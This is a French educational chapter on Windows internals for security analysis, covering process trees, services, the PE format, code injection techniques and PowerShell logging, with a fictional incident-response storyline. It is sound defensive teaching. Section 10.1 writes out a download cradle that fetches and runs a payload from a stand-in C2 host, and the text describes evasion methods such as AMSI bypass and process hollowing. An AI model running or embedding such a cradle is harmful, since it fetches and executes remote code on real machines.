---
title: Partie II — Processus, exécution et code
source: IT/02 Windows/Comprendre Windows/Windows en profondeur.md
note: Windows en profondeur
up:
- - Windows en profondeur
  - index.md
---

*Comment le code s'exécute, se charge et se dissimule — le terrain de jeu des malwares.*

---


## Chapitre 6 — Processus et threads : anatomie et arbre normal

### 6.1 Programme, processus, thread, service

| Notion | Définition | Exemple |
|---|---|---|
| **Programme** | Fichier exécutable sur le disque, inactif tant qu'il n'est pas lancé | `C:\Windows\System32\notepad.exe` |
| **Processus** | Instance d'un programme en cours d'exécution, avec sa mémoire et ses ressources | Le Bloc-notes ouvert (un même programme peut avoir plusieurs processus) |
| **Thread** | Fil d'exécution à l'intérieur d'un processus ; les threads partagent la mémoire du processus | Le thread qui gère l'interface, celui qui enregistre |
| **Service** | Processus d'arrière-plan géré par le SCM (`services.exe`), souvent démarré sans session ouverte | Spouleur d'impression, Windows Update |

```text
Programme = recette · Processus = cuisinier qui l'exécute · Thread = tâche précise du cuisinier
```


### 6.2 Anatomie d'un processus

| Élément | Rôle | Intérêt en analyse |
|---|---|---|
| **PID** / **PPID** | Identifiant du processus / de son parent | Reconstruire l'arbre |
| **Image** (chemin) | Binaire lancé | `svchost.exe` hors de `System32` = suspect |
| **Ligne de commande** | Commande complète | Arguments encodés, URL, chemins temporaires |
| **Jeton d'accès** | Utilisateur, groupes, privilèges, niveau d'intégrité | Avec quels droits le code tourne |
| **Threads** | Unités d'exécution | Thread démarré dans une zone mémoire anonyme = suspect |
| **Handles** | Références vers fichiers, clés, sockets, autres processus | Qui a ouvert `lsass.exe` ? |
| **DLL chargées** | Bibliothèques utilisées | DLL inconnue chargée depuis un dossier inscriptible |
| **PEB** | Structure en mémoire : chemin, ligne de commande, variables, DLL | Lue par les outils d'analyse |

La création passe par `CreateProcess` (API) puis `NtCreateUserProcess` (noyau). Le PPID est la clé de lecture : c'est lui qui révèle qu'un document Office a lancé un interpréteur de commandes.

```powershell
# PID, parent, chemin et ligne de commande de chaque processus
Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine

# Services hébergés par chaque svchost.exe
tasklist /svc
```


### 6.3 L'arbre de processus normal — la baseline de détection

L'essentiel : **System** (PID 4) → **smss.exe** → **csrss.exe** + **wininit.exe** → **services.exe** → **svchost.exe** ; en parallèle, **winlogon.exe** → **userinit.exe** → **explorer.exe** → applications. Pour chaque processus critique, on vérifie le **parent**, le **chemin**, le **nombre d'instances** et le **compte** — la fiche complète est au Ch.31.

**svchost.exe** mérite une attention particulière : chaque instance légitime héberge un ou plusieurs services identifiés par l'argument **`-k`** (`svchost.exe -k netsvcs`). Depuis Windows 10, les services ont souvent chacun leur instance : 30 à 80 svchost sont normaux, mais chacun a un parent (`services.exe`), un chemin et un argument identifiables.

### 6.4 PPID Spoofing

Un attaquant peut forger le PPID via CreateProcess avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — le processus malveillant semble être un enfant d'un processus légitime (svchost.exe, explorer.exe) au lieu de cmd.exe ou powershell.exe. Détection : Sysmon Event 1 enregistre le PPID réel et le ParentImage — la comparaison avec les ETW ou les logs de création de processus du noyau peut révéler l'incohérence.

### 6.5 Fil rouge — SHADOW : l'arbre anormal

> **🔍 SHADOW — Épisode 2**
>
> Léa examine l'arbre de processus complet de la machine compromise dans CrowdStrike. L'anomalie est claire : `winword.exe` (parent : explorer.exe — normal) → `rundll32.exe` (parent : winword.exe — anormal, le parent normal de rundll32 pour les opérations légitimes est explorer.exe ou svchost.exe). De plus, un `svchost.exe` (PID 8240) s'exécute avec le parent `rundll32.exe` — doublement anormal : svchost.exe devrait toujours être enfant de services.exe. Ce svchost.exe n'a pas d'argument -k et son image path est C:\Windows\System32\svchost.exe mais son image en mémoire ne correspond pas (Process Hollowing — Ch.9).

---


## Chapitre 7 — DLLs, services, WMI, COM et mécanismes d'exécution

### 7.1 Les services Windows

Un **service** est un processus conçu pour tourner en arrière-plan, souvent dès le démarrage et sans session ouverte (réseau, mises à jour, journalisation, impression, antivirus…). Les services sont gérés par le **Service Control Manager** (`services.exe`) et configurés dans `HKLM\SYSTEM\CurrentControlSet\Services\<nom>`.

| État | Signification |
|---|---|
| Running / Stopped / Paused | En cours / arrêté / suspendu |
| Start Pending / Stop Pending | En cours de démarrage / d'arrêt |

| Mode de démarrage | Signification |
|---|---|
| Automatic | Au démarrage du système |
| Automatic (Delayed Start) | Au démarrage, avec un délai |
| Manual | À la demande |
| Disabled | Ne peut pas démarrer |

**Le compte d'exécution détermine les droits du service :**

| Compte | Droits locaux | Identité sur le réseau |
|---|---|---|
| `LocalSystem` (NT AUTHORITY\SYSTEM) | Les plus élevés de la machine, au-dessus des administrateurs | Compte machine |
| `NetworkService` | Limités | Compte machine |
| `LocalService` | Limités | Anonyme |
| Compte de service dédié | Ceux qu'on lui donne | Le compte |
| gMSA | Ceux qu'on lui donne ; mot de passe géré par AD | Le compte |

> **Moindre privilège.** Un service n'a pas à tourner en `LocalSystem` s'il n'en a pas besoin : s'il est mal protégé, c'est un tremplin vers le contrôle total de la machine.

**Points à vérifier sur un service :**

| Élément | Pourquoi |
|---|---|
| Chemin du binaire (`BINARY_PATH_NAME`) | Ce qui est exécuté ; un chemin avec espaces doit être entre guillemets |
| Compte d'exécution (`SERVICE_START_NAME`) | Les privilèges obtenus |
| Mode de démarrage | Persistance au redémarrage |
| Permissions du service (SDDL, Ch.17) | Qui peut le reconfigurer, le démarrer, l'arrêter |
| Permissions du dossier du binaire (`icacls`) | Qui peut remplacer l'exécutable |
| Actions de récupération | Programme lancé en cas d'échec |

```powershell
sc.exe qc <service>          # configuration : binaire, compte, démarrage, dépendances
sc.exe sdshow <service>      # permissions du service en SDDL
Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, StartName, PathName
```


Un nouveau service installé produit l'événement **7045** (System) ou **4697** (Security) : en dehors d'un déploiement connu, il mérite d'être examiné.


### 7.2 Les DLL

Les **DLLs** (Dynamic Link Libraries — code partagé entre processus). Le **DLL Search Order** (le répertoire de l'application d'abord, puis System32, puis Windows, puis le PATH → **DLL Hijacking** si un attaquant place une DLL malveillante dans un répertoire prioritaire). Les **Known DLLs** (cache kernel des DLLs système protégées contre le hijacking — HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs).

### 7.3 Services, tâches planifiées et COM

Les **services Windows** (gérés par SCM — services.exe). Types : Win32OwnProcess (son propre processus), Win32ShareProcess (hébergé dans svchost.exe). Un service malveillant avec StartType=Auto = persistence au reboot. Event 7045 = nouveau service installé — signal de détection. Les **scheduled tasks** (Task Scheduler — persistence via tâche au logon/boot ; Event 4698 = tâche créée). Les **COM Objects** (Component Object Model — modèle d'interaction entre composants ; **COM Hijacking** = détournement via modification du CLSID dans le registre — le processus charge la DLL de l'attaquant au lieu du composant légitime).

### 7.4 WMI et BITS

Le **WMI** (Windows Management Instrumentation — framework d'administration) : requêtage (wmic, Get-WmiObject), exécution à distance (wmic process call create "cmd.exe"), et **WMI Event Subscriptions** comme persistence (FilterToConsumerBinding — un événement déclenche l'exécution d'un script ou d'un binaire ; extrêmement discret ; détection : Sysmon Events 19/20/21). Le **BITS** (Background Intelligent Transfer Service — transferts en arrière-plan, utilisable comme canal de téléchargement discret et persistence — bitsadmin, Event BITS).

---


## Chapitre 8 — Format PE et analyse statique

### 8.1 Le format PE

Le format **PE** (Portable Executable — structure commune à .exe, .dll, .sys, .scr). La structure : DOS Header (signature MZ) → PE Header → Optional Header (entry point, image base, subsystem) → Section Table → Sections (.text = code, .data = données, .rdata = imports/exports read-only, .rsrc = ressources). L'**Import Address Table** (IAT — les fonctions importées depuis d'autres DLLs ; les imports suspects : VirtualAlloc, WriteProcessMemory, CreateRemoteThread, NtCreateThreadEx → injection de code ; URLDownloadToFileA → téléchargement ; WinExec, ShellExecute → exécution ; CryptEncrypt → ransomware potentiel). L'**Export Table** (fonctions exportées par une DLL).

### 8.2 Chaînes, entropie, packing et signatures

Les **strings** (chaînes de caractères dans le binaire — URLs C2, commandes, clés de registre, chemins — Strings de Sysinternals ou FLOSS pour les strings obfusquées). L'**entropy** (mesure du « désordre » dans les sections — une entropy élevée > 7 indique du packing ou du chiffrement — les sections .text légitimes ont une entropy de 5-6). Le **packing** (UPX, Themida, VMProtect — le code est compressé/chiffré, décompressé au runtime ; signaux : peu d'imports visibles, forte entropy, sections avec des noms inhabituels). Les **signatures numériques** (Authenticode — un binaire signé par un éditeur légitime est plus fiable ; les certificats volés ou frauduleux sont utilisés par les APT — Stuxnet, SolarWinds ; vérification : sigcheck, Get-AuthenticodeSignature).

Fil rouge : Léa analyse le payload téléchargé par la macro Word — une DLL avec une forte entropy dans .text (packing), des imports suspects (VirtualAlloc, NtCreateThreadEx), et pas de signature Authenticode.

---


## Chapitre 9 — Injection de code et techniques d'évasion

*Les techniques que les malwares modernes utilisent pour exécuter du code dans un autre processus et échapper à la détection.*

### 9.1 Les familles d'injection

Le **Process Injection classique** : OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread — l'attaquant alloue de la mémoire dans un processus légitime, y écrit du shellcode, et crée un thread pour l'exécuter. Le code malveillant s'exécute dans le contexte du processus cible (svchost.exe, explorer.exe) et hérite de sa réputation. Le **DLL Injection** (charger une DLL malveillante via CreateRemoteThread + LoadLibrary, SetWindowsHookEx, ou QueueUserAPC). Le **Process Hollowing** (créer un processus légitime en état suspendu, vider sa mémoire via NtUnmapViewOfSection, remplacer par du code malveillant via WriteProcessMemory, puis reprendre le thread — le processus semble légitime dans le Task Manager mais exécute du code malveillant). Le **Reflective DLL Loading** (charger une DLL en mémoire sans écrire de fichier sur disque et sans appeler LoadLibrary — la DLL se mappe elle-même via son propre loader ; aucun fichier .dll sur le disque → très discret).

### 9.2 Échapper à la surveillance

Le **PPID Spoofing** (CreateProcess avec PPID forgé — Ch.6). Les **syscalls directs** (appeler directement les fonctions kernel — NtAllocateVirtualMemory au lieu de VirtualAllocEx — pour contourner les hooks EDR en user mode ; les EDR hook les fonctions ntdll.dll en user mode → les syscalls directs sautent par-dessus ces hooks).

### 9.3 La détection

| Source | Ce qu'elle montre |
|---|---|
| Sysmon 8 (*CreateRemoteThread*) | Un processus crée un thread dans un autre : source → cible |
| Sysmon 10 (*ProcessAccess*) | Un processus ouvre la mémoire d'un autre, avec les droits demandés |
| Sysmon 25 (*ProcessTampering*) | L'image en mémoire ne correspond plus au fichier sur disque |
| ETW *Microsoft-Windows-Threat-Intelligence* | Les opérations mémoire entre processus, consommées par les EDR |

Les EDR hook les fonctions user mode pour détecter ces techniques — les syscalls directs et le BYOVD (Ch.20) contournent ces défenses.

Fil rouge : le malware de Valtec utilise du Process Hollowing — un processus svchost.exe avec un PID suspect s'exécute avec services.exe comme parent (PPID Spoofing) mais son image en mémoire ne correspond pas à son image sur disque.

---


## Chapitre 10 — PowerShell : exécution, journalisation et investigation

*PowerShell est à la fois l'outil le plus puissant pour l'investigation et le vecteur d'attaque le plus courant.*

### 10.1 PowerShell, outil à double tranchant

PowerShell comme **vecteur d'attaque** : download cradles (IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')), encodage base64 (powershell -enc [base64]), bypass de la politique d'exécution (-ExecutionPolicy Bypass), **AMSI bypass** (les attaquants patachent amsi.dll en mémoire pour désactiver le scan avant exécution — Ch.20), **fileless** (le code est exécuté en mémoire sans jamais toucher le disque — Invoke-ReflectivePEInjection, Invoke-Mimikatz).

### 10.2 La journalisation PowerShell

La **journalisation PowerShell** — les 3 niveaux de défense : **Script Block Logging** (Event 4104 — enregistre TOUT le code exécuté après désobfuscation, y compris après AMSI bypass — la source de détection n°1), **Module Logging** (Event 4103 — enregistre les appels de modules avec les paramètres), **Transcription** (enregistre tout l'input/output dans un fichier texte — le plus complet mais le plus volumineux). Les 3 niveaux doivent être activés par GPO.

### 10.3 PowerShell pour l'investigation

PowerShell pour l'**investigation** : commandes de triage (Get-Process, Get-Service, Get-ScheduledTask, Get-NetTCPConnection, Get-WinEvent — filtrage par Event ID et TimeCreated, Get-ItemProperty registre — clés Run/Services, Get-ChildItem C:\Windows\Prefetch). Fil rouge : Léa examine les logs PowerShell — Event 4104 montre le code déobfusqué du payload : téléchargement via certutil, DLL déposée dans %TEMP%, exécution via rundll32, puis injection en mémoire.

---
